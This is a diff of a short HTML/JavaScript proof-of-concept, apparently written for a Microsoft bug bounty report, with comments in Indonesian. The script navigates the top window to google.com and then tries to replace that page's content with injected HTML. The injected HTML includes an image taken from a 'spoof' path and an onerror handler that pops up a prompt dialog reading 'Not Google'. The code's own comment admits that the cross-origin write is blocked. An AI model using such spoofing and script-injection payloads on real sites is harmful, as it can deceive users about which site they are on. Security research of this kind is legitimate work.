@@ -1,40 +1,38 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>MSRC PoC Demo</title>
-</head>
-<body>
-<h1>MSRC PoC Demo - Safe</h1>
-<button id="trigger">Trigger Prompt</button>
-
 <script>
 function showPrompt() {
-    // Buka tab baru / top-level navigation ke domain test sendiri
-    const win = window.open('https://google.com', '_top');
 
-    // Delay untuk memastikan page baru sudah dimuat
-    setTimeout(function() {
-        // Inject prompt ke halaman baru
-        win.document.body.innerHTML = `
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-   <title>Dhafy</title>
-</head>
-<body>
-    <h1>Dhafy</h1>
-    <img src="https://static.wikia.nocookie.net/anime/images/6/6f/Naruto_Uzumaki.png" alt="Anime Naruto" width="300">
-</body>
-</html>       
-<img src="" onerror="prompt('💡 Demo: bug.bounty.ids dialog persistence','')">
-        `;
-    }, 150);
+    // ⏱️ DELAY sebelum redirect
+    setTimeout(function () {
+
+        // top-level navigation
+        const win = window.open('https://google.com:8080', '_top');
+
+        // ⏱️ delay kecil setelah navigasi
+        setTimeout(function () {
+            try {
+                win.document.body.innerHTML = `
+<center>
+  <h2>𝐷ℎ𝑎𝑓𝑦</h2>
+
+  <a href="https://example.com" target="_blank" rel="noopener">
+    <img
+      src="https://ecdnts-del.github.io/spoof/9de3dae67d67214fee46527f2a5b8d6b.jpg"
+      alt="Demo Image">
+  </a>
+</center>
+
+
+                    <img src="" onerror="prompt('𝑁𝑜𝑡 𝐺𝑜𝑜𝑔𝑙𝑒','')">
+                `;
+            } catch (e) {
+                console.log('Cross-origin DOM blocked (expected)');
+            }
+        }, 250);
+
+    }, 2500); // ← DELAY 2 detik sebelum pindah
 }
 
-// Delay eksekusi untuk trigger setelah klik
-document.getElementById('trigger').addEventListener('click', function() {
-    setTimeout(showPrompt, 300);
+document.getElementById('trigger').addEventListener('click', function () {
+    showPrompt();
 });
 </script>
-</body>
-</html>
